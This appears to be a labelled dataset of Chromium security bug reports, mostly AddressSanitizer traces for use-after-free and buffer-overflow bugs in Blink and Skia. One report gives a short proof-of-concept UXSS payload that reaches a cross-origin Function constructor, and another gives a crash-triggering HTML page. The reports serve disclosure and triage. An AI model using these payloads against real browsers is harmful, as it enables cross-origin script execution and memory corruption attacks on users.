timer runscheduledtask c b\build\slave\win_asan_release\build\src\base\callback.h:396 13 in base basetimertaskinternal run c b\build\slave\win_asan_release\build\src\base\timer\timer.cc:49 14 in base internal invoker 1 base internal bindstate base internal runnableadapter int thiscall ppapi proxy fileioresource writeop void int cdecl ppapi proxy fileioresource writeop void cdecl scoped_refptr ppapi proxy f 15 in base debug taskannotator runtask c b\build\slave\win_asan_release\build\src\base\callback.h:396 16 in base messageloop runtask c b\build\slave\win_asan_release\build\src\base\message_loop\message_loop.cc:436 17 in base messageloop dodelayedwork c b\build\slave\win_asan_release\build\src\base\message_loop\message_loop.cc:446 18 in base messagepumpdefault run c b\build\slave\win_asan_release\build\src\base\message_loop\message_pump_default.cc:36 19 in base messageloop runhandler c b\build\slave\win_asan_release\build\src\base\message_loop\message_loop.cc:405 20 in base runloop run c b\build\slave\win_asan_release\build\src\base\run_loop.cc:55 21 in base messageloop run c b\build\slave\win_asan_release\build\src\base\message_loop\message_loop.cc:298 22 in content renderermain c b\build\slave\win_asan_release\build\src\content\renderer\renderer_main.cc:235 23 in content runnamedprocesstypemain c b\build\slave\win_asan_release\build\src\content\app\content_main_runner.cc:423 24 in content contentmainrunnerimpl run c b\build\slave\win_asan_release\build\src\content\app\content_main_runner.cc:800 25 in content contentmain c b\build\slave\win_asan_release\build\src\content\app\content_main.cc:19 26 in chromemain c b\build\slave\win_asan_release\build\src\chrome\app\chrome_main.cc:66 27 in maindllloader launch c b\build\slave\win_asan_release\build\src\chrome\app\client_util.cc:226 28 in main c b\build\slave\win_asan_release\build\src\chrome\app\chrome_exe_main_win.cc:157 29 in tmaincrtstartup f dd\vctools\crt\crtw32\startup\crt0.c:255 30 in basethreadinitthunk c windows\syswow64\kernel32.dll 31 in rtlinitializeexceptionchain c windows\syswow64\ntdll.dll 32 in rtlinitializeexceptionchain c windows\syswow64\ntdll.dll is located 0 bytes inside of 120-byte region freed by thread t0 here 0 in free c b\build\slave\win_asan_release\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_malloc_win.cc:42 1 in blink datetimeyearfieldelement scalar deleting destructor c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\html\shadow\datetimefieldelements.h:50 2 in blink node removedlastref c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\dom\node.cpp:2262 3 in blink range processancestorsandtheirsiblings c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\dom\treeshared.h:82 4 in blink range processcontents c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\dom\range.cpp:639 5 in blink range deletecontents c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\dom\range.cpp:469 6 in blink domselection deletefromdocument c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\editing\domselection.cpp:454 7 in blink v8domconfiguration installmethod v8 objecttemplate blink v8domconfiguration methodconfiguration c b\build\slave\win_asan_release\build\src\out\release\gen\blink\bindings\core\v8\v8selection.cpp:338 8 in v8 internal functioncallbackarguments call c b\build\slave\win_asan_release\build\src\v8\src\arguments.cc:33 9 in v8 internal builtins builtins c b\build\slave\win_asan_release\build\src\v8\src\builtins.cc:1139 previously allocated by thread t0 here 0 in malloc c b\build\slave\win_asan_release\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_malloc_win.cc:58 1 in blink renderobject operator new c b\build\slave\win_asan_release\build\src\third_party\webkit\source\wtf\partitionalloc.h:477 2 in blink datetimemonthfieldelement create c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\html\shadow\datetimefieldelements.cpp:414 3 in blink datetimeeditbuilder visitfield c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\html\shadow\datetimeeditelement.cpp:235 4 in blink datetimeformat parse c b\build\slave\win_asan_release\build\src\third_party\webkit\source\platform\text\datetimeformat.cpp:198 5 in blink datetimeeditelement layout c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\html\shadow\datetimeeditelement.cpp:132 6 in blink datetimeeditelement setemptyvalue c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\html\shadow\datetimeeditelement.cpp:754 7 in blink basemultiplefieldsdateandtimeinputtype updateview c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\html\forms\basemultiplefieldsdateandtimeinputtype.cpp:536 8 in blink htmlinputelement updatetype c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\html\htmlinputelement.cpp:495 9 in blink htmlinputelement parseattribute c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\html\htmlinputelement.cpp:700 10 in blink element attributechanged c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\dom\element.cpp:1083 11 in blink element didaddattribute c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\dom\element.cpp:2948 12 in blink element appendattributeinternal c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\dom\element.cpp:2087 13 in blink element setattribute c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\dom\element.cpp:1044 14 in blink htmlsourceelement settype c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\html\htmlinputelement.cpp:408 15 in blink domdatastore setreference c b\build\slave\win_asan_release\build\src\out\release\gen\blink\bindings\core\v8\v8htmlinputelement.cpp:1039 16 in v8 internal propertycallbackarguments call c b\build\slave\win_asan_release\build\src\v8\src\arguments.cc:89 17 in v8 internal object setpropertywithaccessor c b\build\slave\win_asan_release\build\src\v8\src\objects.cc:352 18 in v8 internal object setproperty c b\build\slave\win_asan_release\build\src\v8\src\objects.cc:2846 19 in v8 internal storeic store c b\build\slave\win_asan_release\build\src\v8\src\ic\ic.cc:1573 20 in v8 internal storeic_miss c b\build\slave\win_asan_release\build\src\v8\src\ic\ic.cc:2373 summary addresssanitizer heap-use-after-free c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\html\shadow\datetimeeditelement.cpp:810 blink datetimeeditelement valueasdatetimefieldsstate under windbg with symbols chrome_child blink datetimeeditelement valueasdatetimefieldsstate 628c669e ff9044020000 call dword ptr eax+244h ds:002b f000087f as we can see above it s exploitable crash i will investigate this crash deeper	11
security uxss in v8 a full exploit chain was reported to us in issue 453937 jochen could you help with triaging verbatim as reported there the main bug in the exploit chain is uxss src/third_party/webkit/source/bindings/core/v8/custom/v8windowcustom.cpp void v8window openmethodcustom const v8 functioncallbackinfo v8 value info localdomwindow impl tolocaldomwindow v8window toimpl info.holder exceptionstate exceptionstate exceptionstate executioncontext open window info.holder info.getisolate if bindingsecurity shouldallowaccesstoframe info.getisolate impl frame exceptionstate exceptionstate.throwifneeded return src/third_party/webkit/source/bindings/core/v8/exceptionstate.h exceptionstate context context const char propertyname const char interfacename const v8 handle v8 object creationcontext v8 isolate isolate m_code 0 m_context context m_propertyname propertyname m_interfacename interfacename m_creationcontext creationcontext m_isolate isolate when a dom method throws an exception the creation context for the exception object is inherited from the object the method is called on even if it s from a different origin the created object does n't have any access checks so an attacker can use it to obtain a reference to e.g the function constructor repro try window.open.call victimwindow catch ex fun ex.constructor.constructor this is actually victimwindow.function fun alert location or try location.assign.call victimwindow.location catch ex ex.constructor.constructor alert location or try victimwindow.opener 1 catch ex ex.constructor.constructor alert location etc	2
serviceworker api interaction with filesystem api	2
heap-buffer-overflow in skdata newuninitialized vulnerability details the latest 64-bit asan build of filter_fuzz_stub crashes as follows 0113/181345 info filter_fuzz_stub.cc 59 test case repro.fil 20498==error addresssanitizer heap-buffer-overflow on address at pc bp sp write of size 8 at thread t0 0 in skdata mnt/data/b/build/slave/asan_release/build/src/out/release third_party/skia/src/core/skdata.cpp:27 1 in readrawpixels mnt/data/b/build/slave/asan_release/build/src/out/release third_party/skia/src/core/skbitmap.cpp:1213 2 in readbitmap mnt/data/b/build/slave/asan_release/build/src/out/release third_party/skia/src/core/skreadbuffer.cpp:268 3 in createproc mnt/data/b/build/slave/asan_release/build/src/out/release third_party/skia/src/effects/skbitmapsource.cpp:34 4 in readflattenable mnt/data/b/build/slave/asan_release/build/src/out/release third_party/skia/src/core/skvalidatingreadbuffer.cpp:247 5 in skvalidatingdeserializeflattenable void const unsigned long skflattenable type mnt/data/b/build/slave/asan_release/build/src/out/release third_party/skia/src/core/skflattenableserialization.cpp:26 6 in runtestcase mnt/data/b/build/slave/asan_release/build/src/out/release skia/tools/filter_fuzz_stub/filter_fuzz_stub.cc:30 7 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287 is located 8 bytes to the right of 24-byte region allocated by thread t0 here 0 in interceptor_malloc 1 in sk_malloc_throw mnt/data/b/build/slave/asan_release/build/src/out/release skia/ext/skmemory_new_handler.cpp:50 2 in privatenewwithcopy mnt/data/b/build/slave/asan_release/build/src/out/release third_party/skia/src/core/skdata.cpp:66 3 in readrawpixels mnt/data/b/build/slave/asan_release/build/src/out/release third_party/skia/src/core/skbitmap.cpp:1213 4 in readbitmap mnt/data/b/build/slave/asan_release/build/src/out/release third_party/skia/src/core/skreadbuffer.cpp:268 5 in createproc mnt/data/b/build/slave/asan_release/build/src/out/release third_party/skia/src/effects/skbitmapsource.cpp:34 6 in readflattenable mnt/data/b/build/slave/asan_release/build/src/out/release third_party/skia/src/core/skvalidatingreadbuffer.cpp:247 7 in skvalidatingdeserializeflattenable void const unsigned long skflattenable type mnt/data/b/build/slave/asan_release/build/src/out/release third_party/skia/src/core/skflattenableserialization.cpp:26 8 in runtestcase mnt/data/b/build/slave/asan_release/build/src/out/release skia/tools/filter_fuzz_stub/filter_fuzz_stub.cc:30 9 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287 summary addresssanitizer heap-buffer-overflow 0 shadow bytes around the buggy address fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 fa fa fa 00 00 00 fa fa fa fd fd fd fa fa fa fd fd fd fa fa fa 00 00 05 fa fa fa 00 00 04 fa fa fa 00 00 05 fa fa fa 00 00 04 fa fa fa 00 00 00 00 fa fa 00 00 00 00 fa fa fd fd fd fd fa fa fd fd fd fa fa fa fd fd fd fd fa fa fd fd fd fd fa fa fd fd fd fd fa fa fd fd fd fd shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 container overflow fc array cookie ac intra object redzone bb asan internal fe left alloca redzone ca right alloca redzone cb 20498==aborting version chrome version asan-linux-release-311241 reproduction case attached as repro.fil	11
heap-buffer-overflow in skimagefilter common unflatten vulnerability details this bug exists in the deserialisation routines for skimagefilter which can be triggered on the host process from a renderer through ipc for example as part of an swapcompositorframe message the filter_fuzz_stub binary can be used to reproduce the crash using the attached testcase repro.fil an integer overflow vulnerability exists in skautostarray reset farray t sk_malloc_throw count sizeof t this may result in the allocation of an insufficiently sized buffer this can for example be trigger through skimagefilter common allocinputs asan output 0101/141438 info filter_fuzz_stub.cc 59 test case submission4/repro.fil 11105==error addresssanitizer heap-buffer-overflow on address at pc bp sp write of size 4 at thread t0 0 in skimagefilter common unflatten skreadbuffer int mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skimagefilter.cpp:89 1 in skmergeimagefilter createproc skreadbuffer mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/effects/skmergeimagefilter.cpp:112 2 in skvalidatingreadbuffer readflattenable skflattenable type mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skvalidatingreadbuffer.cpp:247 3 in skvalidatingdeserializeflattenable void const unsigned int skflattenable type mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skflattenableserialization.cpp:26 4 in runtestcase mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release skia/tools/filter_fuzz_stub/filter_fuzz_stub.cc:30 5 in readandruntestcase mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release skia/tools/filter_fuzz_stub/filter_fuzz_stub.cc:65 6 in main mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release skia/tools/filter_fuzz_stub/filter_fuzz_stub.cc:81 7 in libc_start_main is located 0 bytes to the right of 1-byte region allocated by thread t0 here 0 in interceptor_malloc 1 in sk_malloc_throw unsigned int mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release skia/ext/skmemory_new_handler.cpp:50 2 in skautostarray 2 skimagefilter reset int mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/include/core/sktemplates.h:295 3 in skimagefilter common allocinputs int mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skimagefilter.cpp:67 4 in skimagefilter common unflatten skreadbuffer int mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skimagefilter.cpp:86 5 in skmergeimagefilter createproc skreadbuffer mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/effects/skmergeimagefilter.cpp:112 6 in skvalidatingreadbuffer readflattenable skflattenable type mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skvalidatingreadbuffer.cpp:247 7 in skvalidatingdeserializeflattenable void const unsigned int skflattenable type mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skflattenableserialization.cpp:26 8 in runtestcase mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release skia/tools/filter_fuzz_stub/filter_fuzz_stub.cc:30 9 in readandruntestcase mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release skia/tools/filter_fuzz_stub/filter_fuzz_stub.cc:65 10 in main mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release skia/tools/filter_fuzz_stub/filter_fuzz_stub.cc:81 11 in libc_start_main summary addresssanitizer heap-buffer-overflow 0 shadow bytes around the buggy address fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 04 fa fa fa 04 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 01 fa fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa 00 05 fa fa 00 04 fa fa 00 05 fa fa 00 07 fa fa 04 fa fa fa 00 fa fa fa 04 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 04 fa fa fa 00 fa fa fa 00 fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 container overflow fc array cookie ac intra object redzone bb asan internal fe left alloca redzone ca right alloca redzone cb 11105==aborting version chrome version asan-symbolized-v8-arm-linux-release-309788 reproduction case attached as repro.fil use 32-bit build of filter_fuzz_stub to reproduce	11
possibly invalid type cast in blink v8lazyeventlistener preparelistenerobject useragent mozilla/5.0 windows nt 6.0 applewebkit/537.36 khtml like gecko chrome/40.0.2214.111 safari/537.36 steps to reproduce the problem the problem is triggered on this page data text/html doctype html html onmousedown true function script document.documentelement.onmousedown script what is the expected behavior nothing happens what went wrong the renderer crashes did this work before n/a chrome version 40.0.2214.111 channel stable os version 6.0 windows vista windows server 2008 flash version shockwave flash 16.0 r0 there seems to be an invalid type cast in blink v8lazyeventlistener preparelistenerobject namely it constructs javascript code through string concatenation then runs it and casts the return value into a function on line 170 however with an incorrect listenersource the return value can be something different the code is triggered by using inline html event listeners i debugged the above page with windbg and found that inside v8 function call the register ecx points to the value which is 1 whereas i guess it should be a pointer to a function i think the line assert result isfunction is hit but it looks like the snapshot i used 1 does not have asserts enabled the solution might be transforming the assert into the early return before it 1	11
heap-use-after-free in blink pendingscript stopwatchingforload vulnerability details the following testcase crashes the latest chrome asan build it crashes reliably with js-flags expose-gc 6026==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 1 at thread t0 chrome 0 in stopwatchingforload mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/pendingscript.cpp:94 1 in detach mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/scriptloader.cpp:116 2 in scriptrunner mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/scriptrunner.cpp:52 3 in deleteptr mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/wtf/ownptrcommon.h:52 discriminator 21 4 in htmldocument mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/htmldocument.cpp:82 5 in postgarbagecollectionprocessing mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/global-handles.cc:330 6 in postmarksweepprocessing mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/global-handles.cc:806 7 in performgarbagecollection mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/heap/heap.cc:1143 8 in collectgarbage mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/heap/heap.cc:853 9 in collectgarbage mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/heap/heap-inl.h:583 10 in requestgarbagecollectionfortesting mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/api.cc:6404 11 in call mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/arguments.cc:33 12 in handleapicallhelper false mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/builtins.cc:1076 13 in builtin_implhandleapicall mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/builtins.cc:1099 discriminator 1 14 unknown module 15 unknown module 16 unknown module 17 unknown module 18 unknown module 14 in invoke mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/execution.cc:128 15 in call mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/api.cc:4088 16 in callfunction mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8scriptrunner.cpp:463 17 in callfunction mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:164 18 in callfunction mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:148 19 in calllistenerfunction mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8lazyeventlistener.cpp:99 20 in invokeeventhandler mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8abstracteventlistener.cpp:125 21 in handleevent mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8abstracteventlistener.cpp:100 22 in handleevent mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8abstracteventlistener.cpp:85 23 in fireeventlisteners mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/events/eventtarget.cpp:376 24 in fireeventlisteners mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/events/eventtarget.cpp:312 25 in dispatchevent mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/frame/localdomwindow.cpp:1589 26 in dispatchloadevent mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/frame/localdomwindow.cpp:1557 27 in dispatchwindowloadevent mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/frame/localdomwindow.cpp:498 28 in implicitclose mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/document.cpp:2515 29 in checkcompleted mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/loader/frameloader.cpp:494 30 in finishedparsing mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/loader/frameloader.cpp:410 31 in finishedparsing mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/document.cpp:4569 32 in end mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:852 33 in processparsedchunkfrombackgroundparser mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:506 34 in pumppendingspeculations mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:561 35 in resumeparsingafteryield mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:303 36 in sharedtimerfiredinternal mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/platform/threadtimers.cpp:137 37 in sharedtimerfired mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/platform/threadtimers.cpp:107 38 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/callback.h:396 39 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/callback.h:396 40 in processtaskfromworkqueue mnt/data/b/build/slave/asan_release/build/src/out/release content/renderer/scheduler/task_queue_manager.cc:416 41 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/callback.h:396 42 in runtask mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_loop.cc:443 43 in deferorrunpendingtask mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_loop.cc:453 44 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_pump_default.cc:32 45 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/run_loop.cc:55 46 in base messageloop run mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_loop.cc:302 47 in renderermain mnt/data/b/build/slave/asan_release/build/src/out/release content/renderer/renderer_main.cc:228 48 in runzygote mnt/data/b/build/slave/asan_release/build/src/out/release content/app/content_main_runner.cc:347 49 in run mnt/data/b/build/slave/asan_release/build/src/out/release content/app/content_main_runner.cc:803 50 in contentmain mnt/data/b/build/slave/asan_release/build/src/out/release content/app/content_main.cc:19 51 in chromemain mnt/data/b/build/slave/asan_release/build/src/out/release chrome/app/chrome_main.cc:66 52 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287 is located 64 bytes inside of 104-byte region freed by thread t0 chrome here 0 in operator delete void 1 in deleteptr mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/wtf/ownptrcommon.h:52 discriminator 1 2 in removedetachedchildrenincontainer mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/containernode.cpp:468 discriminator 1 3 in dispose mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/document.cpp:627 4 in removedlastreftoscope mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/node.cpp:2205 5 in destruct mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/wtf/vector.h:64 6 in deleteptr mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/wtf/ownptrcommon.h:52 discriminator 1 7 in event mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/events/event.cpp:72 8 in postgarbagecollectionprocessing mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/global-handles.cc:330 9 in postmarksweepprocessing mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/global-handles.cc:806 10 in performgarbagecollection mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/heap/heap.cc:1143 11 in collectgarbage mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/heap/heap.cc:853 12 in collectgarbage mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/heap/heap-inl.h:583 13 in requestgarbagecollectionfortesting mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/api.cc:6404 14 in call mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/arguments.cc:33 15 in handleapicallhelper false mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/builtins.cc:1076 16 in builtin_implhandleapicall mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/builtins.cc:1099 discriminator 1 17 unknown module 18 unknown module 19 unknown module 20 unknown module 21 unknown module 17 in invoke mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/execution.cc:128 18 in call mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/api.cc:4088 19 in callfunction mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8scriptrunner.cpp:463 20 in callfunction mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:164 21 in callfunction mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:148 22 in calllistenerfunction mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8lazyeventlistener.cpp:99 23 in invokeeventhandler mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8abstracteventlistener.cpp:125 24 in handleevent mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8abstracteventlistener.cpp:100 previously allocated by thread t0 chrome here 0 in operator new unsigned long 1 in create mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/scriptloader.h:43 2 in scriptconstructor mnt/data/b/build/slave/asan_release/build/src/out/release/gen/blink/core/htmlelementfactory.cpp:1006 3 in createhtmlelement mnt/data/b/build/slave/asan_release/build/src/out/release/gen/blink/core/htmlelementfactory.cpp:1250 4 in createelement mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/document.cpp:741 5 in createelement1methodformainworld mnt/data/b/build/slave/asan_release/build/src/out/release/gen/blink/bindings/core/v8/v8document.cpp:3634 6 in call mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/arguments.cc:33 7 in handleapicallhelper false mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/builtins.cc:1076 8 in builtin_implhandleapicall mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/builtins.cc:1099 discriminator 1 9 unknown module 10 unknown module 11 unknown module 12 unknown module 13 unknown module 9 in invoke mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/execution.cc:128 10 in call mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/api.cc:4088 11 in callfunction mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8scriptrunner.cpp:463 12 in callfunction mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:164 13 in callfunction mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:148 14 in calllistenerfunction mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8lazyeventlistener.cpp:99 15 in invokeeventhandler mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8abstracteventlistener.cpp:125 16 in handleevent mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8abstracteventlistener.cpp:100 17 in handleevent mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8abstracteventlistener.cpp:85 18 in fireeventlisteners mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/events/eventtarget.cpp:376 19 in fireeventlisteners mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/events/eventtarget.cpp:312 20 in dispatchevent mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/frame/localdomwindow.cpp:1589 21 in dispatchloadevent mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/frame/localdomwindow.cpp:1557 22 in dispatchwindowloadevent mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/frame/localdomwindow.cpp:498 23 in implicitclose mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/document.cpp:2515 24 in checkcompleted mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/loader/frameloader.cpp:494 summary addresssanitizer heap-use-after-free 0 shadow bytes around the buggy address fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fd fd fd fd shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right 